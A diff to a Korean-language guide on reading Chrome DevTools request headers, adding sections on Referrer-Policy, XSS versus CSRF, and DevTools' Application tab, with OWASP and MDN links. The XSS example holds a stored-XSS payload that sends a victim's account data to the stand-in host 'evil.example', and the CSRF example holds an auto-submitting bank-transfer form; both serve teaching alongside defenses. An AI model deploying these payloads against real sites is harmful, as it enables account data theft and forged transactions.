@@ -6,6 +6,8 @@ Chrome 개발자 도구(DevTools) Network 탭에서 요청 하나를 클릭하�
 - **A**: Jira에서 이슈 본문을 저장할 때 나가는 GraphQL 요청 (`POST`)
 - **B**: GitHub 이슈에 이미지를 첨부할 때 나가는 업로드 확정 요청 (`PUT`)
 
+뒤쪽에는 문답 중에 나온 Referrer-Policy, XSS와 CSRF, Application 탭 내용을 보충했다.
+
 > 토큰·쿠키·계정 식별자처럼 노출되면 안 되는 값은 `<redacted>`로 가렸다.
 > DevTools 캡처를 공유할 때는 `cookie`, `set-cookie`, `*-xsrf-token`, `authenticity_token`, `authorization`을 꼭 지운다.
 
@@ -27,7 +29,7 @@ Chrome 개발자 도구(DevTools) Network 탭에서 요청 하나를 클릭하�
 | Request method | A: `POST`, B: `PUT` | HTTP 메서드. `PUT`은 "이 자원을 이 상태로 만든다"는 의미여서, 이미 만들어진 업로드 슬롯을 확정할 때 쓴다 |
 | Status code | `200 OK` | 응답 상태 코드 |
 | Remote address | `x.x.x.x:9090` | 브라우저가 실제로 TCP 연결을 맺은 IP:포트. 프록시를 쓰면 목적지 서버가 아니라 프록시 주소가 찍힌다 |
-| Referrer policy | `strict-origin-when-cross-origin` | 이 요청에 `referer` 헤더를 얼마나 담을지 정한 정책. 같은 출처면 전체 URL, 다른 출처면 origin만, HTTPS→HTTP면 보내지 않는다 |
+| Referrer policy | `strict-origin-when-cross-origin` | 이 요청에 `referer` 헤더를 얼마나 담을지 정한 정책. 같은 출처면 전체 URL, 다른 출처면 origin만, HTTPS→HTTP면 보내지 않는다. 자세한 내용은 [Referrer-Policy 자세히](#referrer-policy-자세히) |
 
 ## Headers > Response headers
 
@@ -172,6 +174,149 @@ B 응답 본문(JSON):
 | `Promise.then`, `await in (anonymous)` | | 비동기 경계. 그 아래는 Promise가 이어지기 전의 스택이다 |
 | `(anonymous)` | | 이름 없는 함수(화살표 함수 등) |
 
+## Referrer-Policy 자세히
+
+`referer` 헤더에는 "어느 페이지에서 이 요청을 보냈는가"가 담긴다.
+URL의 경로와 쿼리에 검색어, 문서 ID, 토큰 같은 정보가 섞일 수 있어서, 다른 사이트에 얼마나 알려줄지를 정책으로 정한다.
+
+### 판단 기준 세 가지
+
+1. **같은 출처(same-origin)인가**: scheme, host, port가 모두 같은지 본다. `a.example`과 `sub.a.example`은 같은 사이트(same-site)지만 출처는 다르다(cross-origin).
+2. **다운그레이드인가**: HTTPS 페이지에서 HTTP로 요청하는지 본다. 암호화되지 않은 구간으로 정보가 새는 경우다.
+3. **얼마나 보낼까**: 전체 URL, origin만(`https://a.example/`), 아무것도 안 보냄 중 하나다.
+   - 전체 URL을 보낼 때도 `#fragment`와 `user:password@` 부분은 언제나 빠진다.
+
+### 값별 동작
+
+`https://a.example/page?id=1#top` 페이지에서 요청을 보낸다고 하자.
+
+| 정책 | 같은 출처<br>`https://a.example/x` | 다른 출처(HTTPS)<br>`https://b.example/` | 다운그레이드<br>`http://c.example/` |
+| --- | --- | --- | --- |
+| `no-referrer` | 없음 | 없음 | 없음 |
+| `no-referrer-when-downgrade` | 전체 URL | **전체 URL** | 없음 |
+| `origin` | origin | origin | origin |
+| `origin-when-cross-origin` | 전체 URL | origin | origin |
+| `same-origin` | 전체 URL | 없음 | 없음 |
+| `strict-origin` | origin | origin | 없음 |
+| `strict-origin-when-cross-origin` (현재 브라우저 기본값) | 전체 URL | origin | 없음 |
+| `unsafe-url` | 전체 URL | 전체 URL | 전체 URL |
+
+- **`strict-origin-when-cross-origin`**: 정책을 지정하지 않았을 때 Chrome 85 이후 브라우저가 쓰는 기본값이다.
+  - 같은 사이트 안에서는 분석과 디버깅에 필요한 전체 URL을 보낸다.
+  - 다른 사이트에는 "어느 사이트에서 왔는지"만 알린다.
+  - 다운그레이드에는 아무것도 보내지 않는다.
+  - 이름의 `strict`는 다운그레이드 차단, `when-cross-origin`은 출처가 다를 때만 줄인다는 뜻이다.
+- **`no-referrer-when-downgrade`**: 예전 브라우저의 기본값이다. 다운그레이드만 막고 나머지에는 전부 전체 URL을 보낸다.
+  - 그래서 `https://a.example/reset?token=abc` 같은 URL이 광고·분석 스크립트나 외부 이미지 서버에 그대로 전달됐다.
+  - 이 누출 때문에 지금의 기본값으로 바뀌었다.
+
+### 정책이 정해지는 곳 (뒤로 갈수록 우선)
+
+1. 브라우저 기본값
+2. 문서 응답의 `Referrer-Policy` 헤더, 또는 `<meta name="referrer" content="...">`
+3. 요청 단위 지정: `<a referrerpolicy="...">`, `rel="noreferrer"`, `fetch(url, { referrerPolicy: "..." })`
+
+예시 A를 보면, 요청 General에는 `strict-origin-when-cross-origin`이 찍혔고 응답 헤더에는 `referrer-policy: no-referrer`가 있다.
+요청에 적용된 정책은 이 `fetch`를 보낸 **Jira 페이지 문서**의 정책이다. JSON 응답에 붙은 `no-referrer`는 이 응답이 문서로 열릴 때만 의미가 있어서, 요청 쪽 정책에는 영향을 주지 않는다.
+
+## XSS와 CSRF
+
+두 공격 모두 "로그인한 사용자의 권한으로 원치 않는 일을 시킨다"는 점은 같다. 차이는 **공격 코드가 어디서 실행되는가**다.
+
+| | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
+| --- | --- | --- |
+| 공격 코드가 실행되는 곳 | **피해 사이트 안** (같은 origin) | **공격자 사이트**. 피해 사이트로 요청만 보낸다 |
+| 악용하는 신뢰 | 사이트가 사용자 입력을 그대로 화면에 출력한다 | 사이트가 "쿠키가 붙어 온 요청 = 본인 요청"이라고 믿는다 |
+| 응답을 읽을 수 있나 | 읽을 수 있다. 같은 origin이라 DOM, API 응답, CSRF 토큰까지 볼 수 있다 | 못 읽는다. Same-Origin Policy 때문에 요청을 보내는 것까지만 된다 (blind) |
+| 할 수 있는 일 | 사용자가 그 사이트에서 할 수 있는 거의 모든 것 | 미리 정해 둔 상태 변경 요청 하나 (송금, 설정 변경 등) |
+| 서로의 관계 | XSS가 있으면 CSRF 방어는 무력해진다. 페이지 안에서 토큰을 읽어 정상 요청처럼 보낼 수 있기 때문이다 | CSRF 방어(토큰, SameSite)는 XSS를 막지 못한다 |
+
+### 예시: XSS
+
+예시 A는 Jira 이슈 본문(rich text)을 저장하는 요청이다. 서버가 본문의 HTML을 걸러내지 않는다고 가정하자.
+
+1. 공격자가 이슈 본문에 아래 내용을 넣고 저장한다 (stored XSS).
+   ```html
+   <img src="x" onerror="
+     fetch('/rest/api/3/myself').then(r => r.json())
+       .then(me => fetch('https://evil.example/log', { method: 'POST', body: JSON.stringify(me) }))
+   ">
+   ```
+2. 다른 사용자가 이 이슈를 열면, 스크립트가 `https://<site>.atlassian.net` origin에서 실행된다.
+3. 같은 origin의 API를 그 사용자 권한으로 호출하고, 결과를 공격자 서버로 보낸다.
+   - 세션 쿠키에 `HttpOnly`가 있으면 `document.cookie`로 쿠키 값을 훔치지는 못한다.
+   - 하지만 쿠키는 요청에 자동으로 붙으므로, "사용자인 척 행동하기"는 여전히 된다.
+
+**방어**
+- 출력할 때 이스케이프한다. rich text는 허용 태그 목록으로 정제(sanitize)한다.
+- CSP로 인라인 스크립트와 외부 스크립트 출처를 제한한다. 예시 B의 `default-src 'none'`이 이런 설정이다.
+- 세션 쿠키에 `HttpOnly`를 붙인다.
+
+### 예시: CSRF
+
+사용자가 `bank.example`에 로그인한 상태로 공격자의 페이지 `https://evil.example`을 연다.
+
+```html
+<form action="https://bank.example/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000000">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+- 브라우저는 `bank.example`로 POST를 보내면서 그 도메인의 쿠키를 붙인다. 서버는 본인 요청으로 보고 송금한다.
+- 공격자는 응답을 볼 수 없다. 하지만 송금 자체가 목적이라 응답을 볼 필요가 없다.
+
+**방어** (이 문서의 예시 헤더와 연결된다)
+- **CSRF 토큰**: 페이지에 심어 둔 비밀값을 요청에 함께 보내게 한다. 공격자 페이지는 이 값을 읽을 수 없다.
+  - 예시 A의 `atl-xsrf-token`(헤더), 예시 B의 `authenticity_token`(폼 필드)이 이것이다.
+- **SameSite 쿠키**: `Lax`나 `Strict`이면 다른 사이트에서 시작한 POST에는 쿠키가 붙지 않는다. Chrome 계열은 `SameSite`를 지정하지 않은 쿠키를 `Lax`로 취급한다(브라우저마다 다름).
+- **출처 확인**: 서버가 `origin` 헤더나 `sec-fetch-site: cross-site`를 보고 거부한다.
+- **JSON 본문 요구**: 예시 A는 `content-type: application/json`이다.
+  - HTML 폼으로는 이 형식의 요청을 만들 수 없다.
+  - JavaScript로 다른 출처에 보내려 하면 CORS preflight가 먼저 나가고, 서버가 허용하지 않으면 본 요청은 전송되지 않는다.
+
+## 부록: Application 탭
+
+Network 탭이 "오가는 요청"을 보여준다면, Application 탭은 **브라우저에 저장된 상태**를 보여준다.
+왼쪽 Storage 영역에서 origin별로 저장된 값을 보고, 고치고, 지울 수 있다.
+
+### 저장소 비교
+
+| | Cookies | Local Storage | Session Storage | IndexedDB |
+| --- | --- | --- | --- | --- |
+| 범위 | 도메인 + 경로 (`Domain`, `Path` 속성) | origin | origin + **탭** | origin |
+| 수명 | `Expires`/`Max-Age`까지. 없으면 브라우저를 닫을 때 삭제(세션 쿠키) | 직접 지울 때까지 | 탭을 닫으면 삭제 (새로고침에는 유지) | 직접 지울 때까지 |
+| 용량 | 쿠키 1개당 약 4KB | origin당 약 5MB | origin당 약 5MB | 디스크 용량에 비례하는 큰 할당량 |
+| 서버로 자동 전송 | **매 요청마다 전송** | 안 함 | 안 함 | 안 함 |
+| JavaScript 접근 | `document.cookie` (`HttpOnly`면 불가) | `localStorage.getItem()` | `sessionStorage.getItem()` | `indexedDB.open()` 비동기 API |
+| 데이터 형식 | 문자열 | 문자열 (객체는 `JSON.stringify`) | 문자열 | 객체, Blob, 파일 등 구조화된 데이터 + 인덱스 |
+| API 동작 | - | 동기 (큰 데이터는 화면을 멈추게 함) | 동기 | 비동기, 트랜잭션 |
+| 주 용도 | 로그인 세션, 서버가 알아야 하는 설정 | 테마, 언어처럼 오래 두는 UI 설정 | 폼 임시 입력, 탭별 상태 | 오프라인 데이터, 대용량 캐시 |
+
+- 같은 페이지를 새 탭에서 열면 Session Storage는 새로 시작한다. 탭 복제는 그 시점의 값을 복사해 간다.
+- Local Storage와 Session Storage는 XSS가 일어나면 스크립트가 그대로 읽을 수 있다.
+  - 그래서 로그인 토큰은 여기보다 `HttpOnly` 쿠키에 두는 편이 안전하다.
+
+### Cookies 화면의 열
+
+| 열 | 뜻 |
+| --- | --- |
+| Name, Value | 쿠키 이름과 값 |
+| Domain, Path | 쿠키를 보낼 범위 ([`set-cookie` 속성](#공통-http) 참고) |
+| Expires / Max-Age | 만료 시각. `Session`이면 세션 쿠키 |
+| Size | 이름 + 값의 바이트 수 |
+| HttpOnly, Secure | 체크되어 있으면 해당 속성이 켜져 있음 |
+| SameSite | `Strict` / `Lax` / `None`. 비어 있으면 Chrome은 `Lax`로 취급 |
+| Partition Key | 파티션 쿠키(CHIPS)일 때, 어느 최상위 사이트 아래에서 저장됐는지 |
+| Priority | 쿠키 수가 한도를 넘을 때 먼저 지울 순서 (`Low` / `Medium` / `High`) |
+
+### 그 밖의 항목 (한 줄 요약)
+
+- **Cache storage**: Service Worker가 `Cache` API로 저장한 요청·응답 쌍. 오프라인 대응용
+- **Service workers**: 페이지와 네트워크 사이에서 요청을 가로채는 백그라운드 스크립트의 등록 상태
+- **Storage**: origin별 사용량 확인과 "Clear site data"로 한 번에 지우기
+
 ## 참고
 
 - [MDN: HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
@@ -179,3 +324,8 @@ B 응답 본문(JSON):
 - [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
 - [MDN: Server-Timing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server-Timing)
 - [Chrome DevTools: Network features reference](https://developer.chrome.com/docs/devtools/network/reference)
+- [MDN: Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
+- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Chrome DevTools: Application panel](https://developer.chrome.com/docs/devtools/storage/localstorage)
+- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
